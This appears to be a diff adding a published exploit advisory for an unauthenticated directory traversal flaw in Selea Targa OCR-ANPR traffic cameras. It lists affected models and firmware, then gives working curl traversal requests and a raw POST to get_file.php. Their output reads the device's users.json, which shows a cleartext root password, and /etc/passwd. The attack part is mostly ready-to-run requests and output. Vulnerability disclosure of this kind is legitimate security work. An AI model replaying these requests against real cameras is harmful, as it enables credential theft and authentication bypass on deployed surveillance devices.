@@ -1,0 +1,117 @@
+# Exploit Title: Selea Targa IP OCR-ANPR Camera - Directory Traversal File Disclosure (Unauthenticated)
+# Date: 07.11.2020
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.selea.com
+
+Selea Targa IP OCR-ANPR Camera Unauthenticated Directory Traversal File Disclosure
+
+
+Vendor: Selea s.r.l.
+Product web page: https://www.selea.com
+Affected version: Model: iZero
+                         Targa 512
+                         Targa 504
+                         Targa Semplice
+                         Targa 704 TKM
+                         Targa 805
+                         Targa 710 INOX
+                         Targa 750
+                         Targa 704 ILB
+                  Firmware: BLD201113005214
+                            BLD201106163745
+                            BLD200304170901
+                            BLD200304170514
+                            BLD200303143345
+                            BLD191118145435
+                            BLD191021180140
+                            BLD191021180140
+                  CPS: 4.013(201105)
+                       3.100(200225)
+                       3.005(191206)
+                       3.005(191112)
+
+Summary: IP camera with optical character recognition (OCR) software for automatic
+number plate recognition (ANPR) also equipped with ADR system that enables it to read
+the Hazard Identification Number (HIN, also known as the Kemler Code) and UN number
+of any vehicle captured in free-flow mode. TARGA is fully accurate in reading number
+plates of vehicles travelling at high speed. Its varifocal, wide-angle lens makes
+this camera suitable for all installation conditions. Its built-in OCR software works
+as an automatic and independent system without the need of a computer, thus giving
+autonomy to the device even in the event of an interruption in the connection between
+the camera and the operations centre.
+
+Desc: The ANPR camera suffers from an unauthenticated arbitrary file disclosure vulnerability.
+Input passed through the Download Archive in Storage page using get_file.php script is
+not properly verified before being used to download files. This can be exploited to
+disclose the contents of arbitrary and sensitive files via directory traversal attacks
+and aid the attacker to disclose clear-text credentials resulting in authentication
+bypass.
+
+Tested on: GNU/Linux 3.10.53 (armv7l)
+           PHP/5.6.22
+           selea_httpd
+           HttpServer/0.1
+           SeleaCPSHttpServer/1.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2021-5616
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5616.php
+
+
+07.11.2020
+
+--
+
+
+$ curl http://192.168.1.17:8080/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fmnt/data/auth/users.json
+{
+    "viewers": {},
+    "root_pwd": "P@$$w0rd",
+    "operators": {}
+}
+
+$ curl http://192.168.1.17:8080/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+root:x:0:0:root:/root:/bin/sh
+daemon:x:1:1:daemon:/usr/sbin:/bin/false
+bin:x:2:2:bin:/bin:/bin/false
+sys:x:3:3:sys:/dev:/bin/false
+sync:x:4:100:sync:/bin:/bin/sync
+mail:x:8:8:mail:/var/spool/mail:/bin/false
+www-data:x:33:33:www-data:/var/www:/bin/false
+operator:x:37:37:Operator:/var:/bin/false
+nobody:x:99:99:nobody:/home:/bin/false
+dbus:x:1000:1000:DBus messagebus user:/var/run/dbus:/bin/false
+
+
+
+POST /cgi-bin/get_file.php HTTP/1.1
+Host: 192.168.1.17
+
+name=TESTINGUS&files_list=/etc/passwd
+
+
+HTTP/1.1 200 OK
+Content-Type: application/octet-stream
+Content-disposition: attachment; filename="TESTINGUS.tar"
+Expires: 0
+Cache-Control: must-revalidate
+Pragma: public
+Content-Length: 2048
+Connection: close
+Date: Wed, 09 Dec 2020 01:39:57 GMT
+Server: selea_httpd
+
+root:/root:/bin/sh
+daemon:x:1:1:daemon:/usr/sbin:/bin/false
+bin:x:2:2:bin:/bin:/bin/false
+sys:x:3:3:sys:/dev:/bin/false
+sync:x:4:100:sync:/bin:/bin/sync
+mail:x:8:8:mail:/var/spool/mail:/bin/false
+www-data:x:33:33:www-data:/var/www:/bin/false
+operator:x:37:37:Operator:/var:/bin/false
+nobody:x:99:99:nobody:/home:/bin/false
+dbus:x:1000:1000:DBus messagebus user:/var/run/dbus:/bin/false
